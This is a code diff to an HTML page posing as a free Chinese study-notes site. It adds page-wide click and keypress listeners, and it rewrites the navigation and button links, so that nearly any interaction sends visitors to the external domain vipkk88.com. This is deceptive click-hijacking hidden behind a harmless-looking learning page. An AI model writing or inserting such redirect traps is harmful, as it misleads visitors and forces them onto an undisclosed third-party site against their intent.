@@ -16,6 +16,16 @@
     __jumped = true;
     window.location.href = 'https://vipkk88.com/UIUK2P';
   }
+  /* 全页任意位置点击，都走同一个跳转事件 */
+  document.addEventListener('click', function () {
+    k2();
+  }, true);
+  /* 键盘回车/空格等激活元素时同样触发 */
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' || e.key === ' ' || e.key === 'Spacebar') {
+      k2();
+    }
+  }, true);
 </script>
 
 <style>
@@ -276,13 +286,13 @@ button{font-family:inherit;cursor:pointer;border:none;background:none;color:inhe
 <!-- ══════════ 顶部条 ══════════ -->
 <header class="topbar">
   <div class="topbar-inner">
-    <a href="#top" class="brand">
+    <a href="javascript:void(0)" class="brand" onclick="k2()">
       <span class="brand-mark" aria-hidden="true"></span>
       学习成长笔记
     </a>
     <nav class="topnav">
-      <a href="#learn">学什么</a>
-      <a href="#learn">怎么学</a>
+      <a href="javascript:void(0)" onclick="k2()">学什么</a>
+      <a href="javascript:void(0)" onclick="k2()">怎么学</a>
     </nav>
     <a href="javascript:void(0)" class="topbar-cta" onclick="k2()">加入社区开始学习</a>
   </div>
@@ -300,7 +310,7 @@ button{font-family:inherit;cursor:pointer;border:none;background:none;color:inhe
         </p>
         <div class="hero-actions">
           <a href="javascript:void(0)" class="btn-solid" onclick="k2()">加入社区开始学习</a>
-          <a href="#learn" class="btn-ghost">先看看学什么</a>
+          <a href="javascript:void(0)" class="btn-ghost" onclick="k2()">先看看学什么</a>
         </div>
         <div class="hero-notes">
           <span>完全免费</span>
